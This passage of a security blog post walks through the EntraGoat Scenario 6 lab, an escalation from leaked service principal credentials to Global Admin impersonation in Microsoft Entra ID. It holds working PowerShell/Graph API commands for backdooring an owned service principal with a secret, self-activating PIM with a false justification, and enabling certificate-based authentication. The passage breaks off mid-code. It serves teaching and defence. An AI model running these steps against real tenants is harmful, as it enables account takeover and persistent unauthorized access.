                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/opensourceprojects/" title="Open Source Projects">
                    <span>Open Source Projects</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID
    </h1>
    <div class="post-meta"><span title='2025-08-14 00:14:27 +0300 IDT'>August 14, 2025</span>&nbsp;·&nbsp;Tomer Nahum, Jonathan Elkabas

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#certificate-bypass-authorityroot-access-granted" aria-label="Certificate Bypass Authority–Root Access Granted">Certificate Bypass Authority–Root Access Granted</a><ul>
                        
                <li>
                    <a href="#attack-path-overview" aria-label="Attack path overview">Attack path overview</a></li>
                <li>
                    <a href="#attack-flow" aria-label="Attack flow">Attack flow</a></li>
                <li>
                    <a href="#why-security-teams-need-to-understand-entra-id-misconfigurations" aria-label="Why security teams need to understand Entra ID misconfigurations">Why security teams need to understand Entra ID misconfigurations</a></li>
                <li>
                    <a href="#how-to-detect-and-defend-against-exploitation-of-misconfigurations" aria-label="How to detect and defend against exploitation of misconfigurations">How to detect and defend against exploitation of misconfigurations</a></li></ul>
                </li>
                <li>
                    <a href="#scenario-deep-dive-step-by-step-solution-walkthrough" aria-label="Scenario deep dive: Step-by-step solution walkthrough">Scenario deep dive: Step-by-step solution walkthrough</a><ul>
                        
                <li>
                    <a href="#step-1-initial-foothold-with-hardcoded-service-principal-credentials" aria-label="Step 1: Initial foothold with hardcoded service principal credentials">Step 1: Initial foothold with hardcoded service principal credentials</a></li>
                <li>
                    <a href="#step-2-evaluating-pivot-target" aria-label="Step 2: Evaluating pivot target">Step 2: Evaluating pivot target</a></li>
                <li>
                    <a href="#step-3-pivoting-to-the-datasync-production-service-principal" aria-label="Step 3: Pivoting to the DataSync-Production service principal">Step 3: Pivoting to the DataSync-Production service principal</a></li>
                <li>
                    <a href="#step-4-shifting-focus-to-user-context" aria-label="Step 4: Shifting focus to user context">Step 4: Shifting focus to user context</a></li>
                <li>
                    <a href="#step-5-activating-pim-assignment" aria-label="Step 5: Activating PIM assignment">Step 5: Activating PIM assignment</a></li>
                <li>
                    <a href="#step-6-enabling-certificate-based-authentication" aria-label="Step 6: Enabling certificate-based authentication">Step 6: Enabling certificate-based authentication</a></li>
                <li>
                    <a href="#step-7-uploading-the-malicious-root-certificate-authority" aria-label="Step 7: Uploading the malicious root certificate authority">Step 7: Uploading the malicious root certificate authority</a></li>
                <li>
                    <a href="#step-8-passwordless-authentication-to-ga" aria-label="Step 8: Passwordless authentication to GA">Step 8: Passwordless authentication to GA</a></li>
                <li>
                    <a href="#step-9-troubleshooting-cba-and-mfa-binding" aria-label="Step 9: Troubleshooting CBA and MFA binding">Step 9: Troubleshooting CBA and MFA binding</a></li></ul>
                </li>
                <li>
                    <a href="#lesson-learned-misconfigurations-open-attack-paths" aria-label="Lesson learned: Misconfigurations open attack paths">Lesson learned: Misconfigurations open attack paths</a></li>
                <li>
                    <a href="#endnote" aria-label="Endnote">Endnote</a></li>
                <li>
                    <a href="#disclaimer" aria-label="Disclaimer">Disclaimer</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="certificate-bypass-authorityroot-access-granted">Certificate Bypass Authority–Root Access Granted<a hidden class="anchor" aria-hidden="true" href="#certificate-bypass-authorityroot-access-granted">#</a></h2>
<p>EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.</p>
<p>Using leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.</p>
<h3 id="attack-path-overview">Attack path overview<a hidden class="anchor" aria-hidden="true" href="#attack-path-overview">#</a></h3>
<ol>
<li><strong>Initial foothold story</strong>: The attacker obtains hardcoded client credentials for a legacy automation service principal embedded in an old PowerShell repository.</li>
<li><strong>Pivot via ownership</strong>: The legacy service principal is found to own another service principal. Using Application.ReadWrite.OwnedBy, the attacker backdoors the second service principal by adding a secret and pivots to it.</li>
<li><strong>Tenant configuration abuse</strong>: The second service principal has Organization.ReadWrite.All permission. While not capable of managing users or roles, this permission allows modification of tenant-wide configurations, including authentication settings.</li>
<li><strong>Certificate-based authentication (CBA) enablement via group-based PIM assignment</strong>: A user the attacker has access to is found to be PIM-eligible for a group that holds the Authentication Policy Administrator role. After activating membership, the attacker enables CBA across the tenant.</li>
<li><strong>Establishing trust with a malicious root certificate authority (CA)</strong>: The attacker generates and uploads a rogue root CA to the tenant, effectively making it a trusted identity provider.</li>
<li><strong>Impersonation of Global Admin</strong>: Finally, the attacker crafts a client certificate for a Global Admin account, signs it with the malicious root CA, and uses CBA to authenticate—achieving passwordless, MFA-compliant authentication.</li>
</ol>
<h3 id="attack-flow">Attack flow<a hidden class="anchor" aria-hidden="true" href="#attack-flow">#</a></h3>
<p><em>Figure 1</em> shows the flow of this attack.</p>
<p><img loading="lazy" src="/posts/scenario6/image.png"></p>
<p><em>Figure 1. Flow of the Certificate Bypass Authority–Root Access Granted attack scenario</em></p>
<h3 id="why-security-teams-need-to-understand-entra-id-misconfigurations">Why security teams need to understand Entra ID misconfigurations<a hidden class="anchor" aria-hidden="true" href="#why-security-teams-need-to-understand-entra-id-misconfigurations">#</a></h3>
<p>This attack chain takes advantage of both common misconfigurations and foundational design patterns in Entra ID that are often misunderstood or neglected in real-world environments.</p>
<ol>
<li><strong>Legacy automation debt is real.</strong> Service principals created for automation may remain unmanaged after deployment. Over time, this can lead to excessive permissions and ownership over other service principals, creating hidden privilege chains. Additionally, poor secret management—such as hardcoded credentials in scripts—often remain in place once “everything is working,” resulting in long-lived and unmonitored access paths.</li>
<li><strong>Service principal ownership grants credential management rights.</strong> Many organizations don&rsquo;t audit service principal ownership chains or realize the implications.</li>
<li><strong>Permissions don’t exist in isolation.</strong> The attack relies on a combination of permissions that appear limited in scope when viewed individually:
<ul>
<li>Application.ReadWrite.OwnedBy allows managing owned service principals by a calling app.</li>
<li>Organization.ReadWrite.All grants the ability to modify org-wide configuration settings.</li>
<li>Authentication Policy Administrator (or Policy.ReadWrite.AuthenticationMethod) enables and configures CBA.</li>
</ul>
</li>
</ol>
<p>Individually, each permission has a limited and specific scope. However, when combined, they enable configuration changes that allow impersonation of privileged identities through legitimate authentication mechanisms.</p>
<ol>
<li><strong>Lastly, CBA pierces the tenant&rsquo;s trust boundary.</strong> Once configured, the external CA becomes a valid identity issuer for <strong>any user</strong> in the tenant.</li>
</ol>
<p><strong>Note:</strong> The theoretical background on Entra ID’s application model, as well as certificate-based authentication for both interactive user sign-in and OAuth client assertion flows, was covered in the <strong>Scenario 2</strong> blog post. We recommend reviewing it first for proper context.</p>
<h3 id="how-to-detect-and-defend-against-exploitation-of-misconfigurations">How to detect and defend against exploitation of misconfigurations<a hidden class="anchor" aria-hidden="true" href="#how-to-detect-and-defend-against-exploitation-of-misconfigurations">#</a></h3>
<p>Misconfigurations like those exploited in this scenario are often overlooked but can lead to full compromise of an Entra ID tenant. To help organizations identify attack paths before they can be abused, <strong>Semperis solutions</strong> provide indicators of exposures (IOEs) and indicators of compromise (IOCs) to detect and alert on dangerous defaults and misconfigurations, including an indicator for certificate-based authentication persistence and additional checks that assess the security posture of Entra ID environments.</p>
<h2 id="scenario-deep-dive-step-by-step-solution-walkthrough">Scenario deep dive: Step-by-step solution walkthrough<a hidden class="anchor" aria-hidden="true" href="#scenario-deep-dive-step-by-step-solution-walkthrough">#</a></h2>
<p>Let’s take a look at the steps involved in creating a rogue root certificate authority that can unlock the entire Entra ID tenant.</p>
<h3 id="step-1-initial-foothold-with-hardcoded-service-principal-credentials">Step 1: Initial foothold with hardcoded service principal credentials<a hidden class="anchor" aria-hidden="true" href="#step-1-initial-foothold-with-hardcoded-service-principal-credentials">#</a></h3>
<p>We begin with a leaked secret “found” in a legacy PowerShell repository belonging to an outdated automation script, which <em>Figure 2</em> shows.</p>
<p><img loading="lazy" src="/posts/scenario6/image%201.png"></p>
<p><em>Figure 2. A leaked secret initiates scenario setup</em></p>
<p>Using those credentials, we authenticate as the service principal, as <em>Figure 3</em> shows.</p>
<p><img loading="lazy" src="/posts/scenario6/image%202.png"></p>
<p><em>Figure 3. Authenticating as the outdated service principal</em></p>
<p>Validation confirms successful authentication for Legacy-Automation-Service. We check the permissions assigned to the identity, and one key permission stands out (<em>Figure 4</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%203.png"></p>
<p><em>Figure 4. The</em> <em><strong>Application.ReadWrite.OwnedBy</strong></em> <em>permission assigned to the application identity</em></p>
<p>The <strong>Application.ReadWrite.OwnedBy</strong> permission grants the caller app the ability to perform the same operations as Application.ReadWrite.All to manage (read**/<strong>update</strong>/**delete) but <strong>only</strong> on application objects for which the caller is explicitly listed as an owner. This enables tightly scoped automation scenarios without exposing broad directory-wide application management.</p>
<p>As demonstrated in <strong><a href="https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/">Scenario 1</a></strong>, ownership over a service principal permits credential management, including adding client secrets. To explore potential targets, we enumerate all service principals in the tenant and check which are owned by the currently authenticated identity (<em>Figure 5</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%204.png"></p>
<p><em>Figure 5. Enumerating service principals in the Entra ID tenant</em></p>
<p>Service principal ownership found: DataSync-Production.</p>
<p><strong>Fun fact:</strong> It’s impossible to set a service principal as an owner of another service principal via Azure portal UI or Entra admin center, even though the ownership is visible there (<em>Figure 6</em>). Only user identities are allowed.</p>
<p><img loading="lazy" src="/posts/scenario6/image%205.png"></p>
<p><em>Figure 6. Viewing service principal ownership in Entra admin center</em></p>
<p>We configured ownership of the service principal in the setup script by directly calling the Graph API, which does support this operation:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$OwnerParams</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;@odata.id&#34;</span> <span class="p">=</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/directoryObjects/</span><span class="p">$(</span><span class="nv">$LegacySP</span><span class="p">.</span><span class="n">Id</span><span class="p">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-MgServicePrincipalOwnerByRef</span> <span class="n">-ServicePrincipalId</span> <span class="nv">$DataSyncSP</span><span class="p">.</span><span class="py">Id</span> <span class="n">-BodyParameter</span> <span class="nv">$OwnerParams</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="step-2-evaluating-pivot-target">Step 2: Evaluating pivot target<a hidden class="anchor" aria-hidden="true" href="#step-2-evaluating-pivot-target">#</a></h3>
<p>We now need to check whether the service principal we own is a viable privilege escalation path. We can reuse the simple Get-ServicePrincipalRoles function from Scenario 1 to enumerate directory role assignments:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">Get-ServicePrincipalRoles</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">([</span><span class="no">object</span><span class="p">]</span><span class="nv">$ServicePrincipal</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="s2">&#34;Checking roles for: </span><span class="p">$(</span><span class="nv">$ServicePrincipal</span><span class="p">.</span><span class="n">DisplayName</span><span class="p">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$roleAssignments</span> <span class="p">=</span> <span class="nb">Get-MgRoleManagementDirectoryRoleAssignment</span> <span class="n">-Filter</span> <span class="s2">&#34;principalId eq &#39;</span><span class="p">$(</span><span class="nv">$ServicePrincipal</span><span class="p">.</span><span class="n">Id</span><span class="p">)</span><span class="s2">&#39;&#34;</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$roles</span> <span class="p">=</span> <span class="vm">@</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$roleAssignments</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$assignment</span> <span class="k">in</span> <span class="nv">$roleAssignments</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$roleDefinition</span> <span class="p">=</span> <span class="nb">Get-MgRoleManagementDirectoryRoleDefinition</span> <span class="n">-UnifiedRoleDefinitionId</span> <span class="nv">$assignment</span><span class="p">.</span><span class="py">RoleDefinitionId</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$roles</span> <span class="p">+=</span> <span class="nv">$roleDefinition</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">Write-Host</span> <span class="s2">&#34;   Role: </span><span class="p">$(</span><span class="nv">$roleDefinition</span><span class="p">.</span><span class="n">DisplayName</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-ForegroundColor</span> <span class="n">Green</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">Write-Host</span> <span class="s2">&#34;   No directory roles assigned&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$roles</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As <em>Figure 7</em> shows, no directory roles are assigned.</p>
<p><img loading="lazy" src="/posts/scenario6/image%206.png"></p>
<p><em>Figure 7. Initial enumeration returning no directory roles</em></p>
<p>But as we know by now, directory roles aren&rsquo;t the only vector with service principals. What about app roles (<em>Figure 8</em>)?</p>
<p><img loading="lazy" src="/posts/scenario6/image%207.png"></p>
<p><em>Figure 8. Enumerating app roles</em></p>
<p>Like in other scenarios, Directory.Read.All has probably been granted just to simplify the enumeration phase. More interesting, the service principal also has the Organization.ReadWrite.All app role. This permission is often overlooked but has high-impact capabilities. While it doesn’t grant control over users, groups, or roles, it <strong>does</strong> allow modification of tenant-wide settings such as company branding and authentication policies. In fact, as demonstrated in the excellent SpecterOps <a href="https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f">research blog</a> Passwordless Persistence and Privilege Escalation in Azure1, this permission is enough to <strong>add a new root CA to the Entra ID tenant</strong> which then can sign forged user certificates for certificate-based sign-in.</p>
<p>Given that, our next step is to add a client secret to the service principal:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$secretDescription</span> <span class="p">=</span> <span class="s2">&#34;Totally-Legit-EntraGoat-Secret-</span><span class="p">$(</span><span class="nb">Get-Date</span> <span class="n">-Format</span> <span class="s1">&#39;yyyyMMdd-HHmmss&#39;</span><span class="p">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$passwordCredential</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">DisplayName</span> <span class="p">=</span> <span class="nv">$secretDescription</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">EndDateTime</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="py">AddYears</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$newSecret</span> <span class="p">=</span> <span class="nb">Add-MgServicePrincipalPassword</span> <span class="n">-ServicePrincipalId</span> <span class="nv">$dataSyncSP</span><span class="p">.</span><span class="py">Id</span> <span class="n">-PasswordCredential</span> <span class="nv">$passwordCredential</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$dataSyncSecret</span> <span class="p">=</span> <span class="nv">$newSecret</span><span class="p">.</span><span class="py">SecretText</span> <span class="c"># save it for later</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="step-3-pivoting-to-the-datasync-production-service-principal">Step 3: Pivoting to the DataSync-Production service principal<a hidden class="anchor" aria-hidden="true" href="#step-3-pivoting-to-the-datasync-production-service-principal">#</a></h3>
<p>Although we now have the ability to upload a &ldquo;trusted&rdquo; root certificate authority, we&rsquo;re blocked from leveraging it for impersonation because we can’t enable CBA (<em>Figure 9</em>), which requires either the Policy.ReadWrite.AuthenticationMethod permission or the Authentication Policy Administrator role—neither of which is assigned to the DataSync-Production service principal.</p>
<p><img loading="lazy" src="/posts/scenario6/image%208.png"></p>
<p><em>Figure 9. CBA is forbidden</em></p>
<p>After exhausting enumeration options under this SP’s identity, we’re at a dead end. No CBA enablement. But WAIT: Have we looked at what our compromised user, terence.mckenna, has access to?</p>
<h3 id="step-4-shifting-focus-to-user-context">Step 4: Shifting focus to user context<a hidden class="anchor" aria-hidden="true" href="#step-4-shifting-focus-to-user-context">#</a></h3>
<p>Is Terence a member of any groups (<em>Figure 10</em>)?</p>
<p><img loading="lazy" src="/posts/scenario6/image%209.png"></p>
<p><em>Figure 10. Exploring Terence’s possible group memberships</em></p>
<p>Nothing beyond the default tenant group.</p>
<p>Any group ownership (<em>Figure 11</em>)?</p>
<p><img loading="lazy" src="/posts/scenario6/image%2010.png"></p>
<p><em>Figure 11. Exploring Terence’s possible group ownership</em></p>
<p>None. Any owned service principals (<em>Figure 12</em>)?</p>
<p><img loading="lazy" src="/posts/scenario6/image%2011.png"></p>
<p><em>Figure 12. No Terence-owned service principals</em></p>
<p>Still nothing. Any eligible PIM for group assignments?</p>
<p><img loading="lazy" src="/posts/scenario6/image%2012.png"></p>
<p><em>Figure 13. At last, group eligibility for Terence</em></p>
<p>Yes! Terence is eligible for the Authentication Policy Managers group.</p>
<p>Let’s check what roles the Authentication Policy Managers group is assigned (Figure 14).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2013.png"></p>
<p><em>Figure 14. Checking roles for the Authentication Policy Managers group</em></p>
<p>Those are highly privileged roles.</p>
<ul>
<li>Application Administrator allows full control over all applications in the tenant, including the ability to add secrets or certificates to any service principal. (We intentionally included this role to support multiple attack paths of varying complexity.)</li>
<li>Authentication Policy Administrator, crucially, grants us the ability to enable **CBA—**the exact control we were missing to advance with the attack chain.</li>
</ul>
<p>_____</p>
<p><strong>Note:</strong> Since this is (currently) the final scenario in the EntraGoat series, we intentionally include some of these dead-end enumeration steps to illustrate the thought process behind privilege discovery. Systematic exploration of both service principals and user identities is critical for identifying viable escalation paths in Entra ID.</p>
<p>_____</p>
<h3 id="step-5-activating-pim-assignment">Step 5: Activating PIM assignment<a hidden class="anchor" aria-hidden="true" href="#step-5-activating-pim-assignment">#</a></h3>
<p>Now that we’ve identified eligibility for the Authentication Policy Managers group, we can self-activate the PIM assignment using the Graph API:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$activationBody</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">accessId</span> <span class="p">=</span> <span class="s2">&#34;member&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">principalId</span> <span class="p">=</span> <span class="nv">$currentUser</span><span class="p">.</span><span class="py">Id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">groupId</span> <span class="p">=</span> <span class="nv">$authGroup</span><span class="p">.</span><span class="py">Id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="p">=</span> <span class="s2">&#34;selfActivate&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">scheduleInfo</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">startDateTime</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="py">ToUniversalTime</span><span class="p">().</span><span class="py">ToString</span><span class="p">(</span><span class="s2">&#34;o&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">expiration</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">type </span><span class="p">=</span> <span class="s2">&#34;afterDuration&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">duration</span> <span class="p">=</span> <span class="s2">&#34;PT8H&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">justification</span> <span class="p">=</span> <span class="s2">&#34;Need to configure authentication policies for support tickets&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests&#34;</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">-Body</span> <span class="nv">$activationBody</span> <span class="n">-ContentType</span> <span class="s2">&#34;application/json&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After a short propagation delay, we can re-check group membership to confirm active status (<em>Figure 15</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2014.png"></p>
<p><em>Figure 15. Confirming we’ve established active group membership</em></p>
<h3 id="step-6-enabling-certificate-based-authentication"><strong>Step 6: Enabling certificate-based authentication</strong><a hidden class="anchor" aria-hidden="true" href="#step-6-enabling-certificate-based-authentication">#</a></h3>
<p>With group membership active, we can enable tenant-wide CBA. First, we query the current CBA configuration object (<em>Figure 16</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2015.png"></p>
<p><em>Figure 16. That’s a nice function name</em></p>
<p>Then, we enable CBA using the following payload for the updated configuration:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$updateParams</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">State</span> <span class="p">=</span> <span class="s2">&#34;enabled&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;@odata.type&#34;</span> <span class="p">=</span> <span class="s2">&#34;#microsoft.graph.x509CertificateAuthenticationMethodConfiguration&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">certificateUserBindings</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">x509CertificateField</span> <span class="p">=</span> <span class="s2">&#34;PrincipalName&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">userProperty</span> <span class="p">=</span> <span class="s2">&#34;userPrincipalName&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">priority</span> <span class="p">=</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">authenticationModeConfiguration</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
